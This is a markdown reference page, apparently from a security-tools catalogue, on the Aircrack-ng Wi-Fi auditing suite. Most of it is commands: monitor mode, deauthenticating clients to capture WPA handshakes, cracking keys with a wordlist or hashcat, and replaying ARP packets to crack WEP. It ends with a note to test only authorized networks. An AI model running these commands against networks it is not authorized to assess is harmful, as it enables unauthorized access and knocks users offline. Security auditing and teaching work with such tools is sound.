---
name: Aircrack-ng
category: Traffic Analysis & Wireless
description: Full Wi-Fi auditing suite (capture, deauth, WEP/WPA/WPA2 cracking).
tags: [wifi, wireless, wpa, handshake, deauth, monitor]
---

# Aircrack-ng

**Aircrack-ng** is a complete suite for Wi-Fi security auditing: putting the card in monitor mode, capturing packets, deauthenticating clients to force handshakes, and cracking WEP/WPA/WPA2 keys. Requires a wireless adapter that supports monitor mode + injection.

> `apt install aircrack-ng` · **requires root** · [aircrack-ng.org](https://www.aircrack-ng.org)

## The suite

| Tool | Role |
|------|------|
| `airmon-ng` | Enable/disable monitor mode |
| `airodump-ng` | Scan and capture packets |
| `aireplay-ng` | Inject / deauth |
| `aircrack-ng` | Crack the key |
| `airbase-ng` | Rogue AP |

## 1) Monitor mode

```bash
sudo airmon-ng check kill                # stop interfering processes
sudo airmon-ng start wlan0                # creates wlan0mon
iwconfig                                   # confirm monitor mode
```

## 2) Scan for networks

```bash
sudo airodump-ng wlan0mon                             # list all APs/clients
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon   # lock onto target
```

Note the **BSSID**, **channel** and connected **client** MACs.

## 3) Capture the WPA handshake

```bash
# Keep airodump running on the target, then in another terminal deauth a client
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c <CLIENT_MAC> wlan0mon
```

When a client reconnects you'll see **"WPA handshake: AA:BB:..."** in airodump — that's captured in `cap-01.cap`.

## 4) Crack the handshake

```bash
aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF cap-01.cap
```

Faster on GPU via [hashcat](#/tool/hashcat) (convert first):

```bash
hcxpcapngtool -o hash.hc22000 cap-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt
```

## WEP (legacy)

```bash
sudo airodump-ng -c 6 --bssid <BSSID> -w wep wlan0mon
sudo aireplay-ng --arpreplay -b <BSSID> wlan0mon      # generate IVs
aircrack-ng wep-01.cap                                  # cracks with enough IVs
```

## Cleanup

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

> Only test networks you own or are authorized to assess. WPA/WPA2 cracking is a **dictionary** attack on the handshake — strong passphrases won't fall. PMKID capture (`hcxdumptool`) can skip the deauth step.
